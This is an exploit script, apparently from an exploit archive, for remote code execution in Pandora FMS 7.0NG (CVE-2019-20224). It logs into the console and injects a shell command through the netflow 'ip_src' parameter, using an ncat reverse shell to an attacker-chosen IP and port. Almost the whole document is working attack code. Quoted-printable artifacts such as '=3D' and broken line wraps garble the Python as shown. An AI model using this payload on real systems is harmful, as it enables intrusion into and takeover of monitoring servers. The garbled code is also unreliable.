# Exploit Title: Pandora 7.0NG - Remote Code Execution
# Date: 2019-11-14
# Exploit Author: Askar (@mohammadaskar2)
# CVE: CVE-2019-20224
# Vendor Homepage: https://pandorafms.org/
# Software link: https://pandorafms.org/features/free-download-monitoring-software/
# Version: v7.0NG
# Tested on: CentOS 7.3 / PHP 5.4.16

#!/usr/bin/python3

import requests
import sys

if len(sys.argv) !=3D 6:
    print("[+] Usage : ./exploit.py target username password ip port")
    exit()

target =3D sys.argv[1]
username =3D sys.argv[2]
password =3D sys.argv[3]
ip =3D sys.argv[4]
port =3D int(sys.argv[5])

request =3D requests.session()

login_info =3D {
    "nick": username,
    "pass": password,
    "login_button": "Login"
}

login_request =3D request.post(
    target+"/pandora_console/index.php?login=3D1",
    login_info,
    verify=3DFalse,
    allow_redirects=3DTrue
 )

resp =3D login_request.text

if "User not found in database" in resp:
    print("[-] Login Failed")
    exit()
else:
    print("[+] Logged In Successfully")

print("[+] Sending crafted graph request ..")

body_request =3D {
    "date": "0",
    "time": "0",
    "period": "0",
    "interval_length": "0",
    "chart_type": "netflow_area",
    "max_aggregates": "1",
    "address_resolution": "0",
    "name": "0",
    "assign_group": "0",
    "filter_type": "0",
    "filter_id": "0",
    "filter_selected": "0",
    "ip_dst": "0",
    "ip_src": '";ncat -e /bin/bash {0} {1} #'.format(ip, port),
    "draw_button": "Draw"
}

draw_url =3D target + "/pandora_console/index.php?sec=3Dnetf&sec2=3Doperati=
on/netflow/nf_live_view&pure=3D0"
print("[+] Check your netcat ;)")
request.post(draw_url, body_request)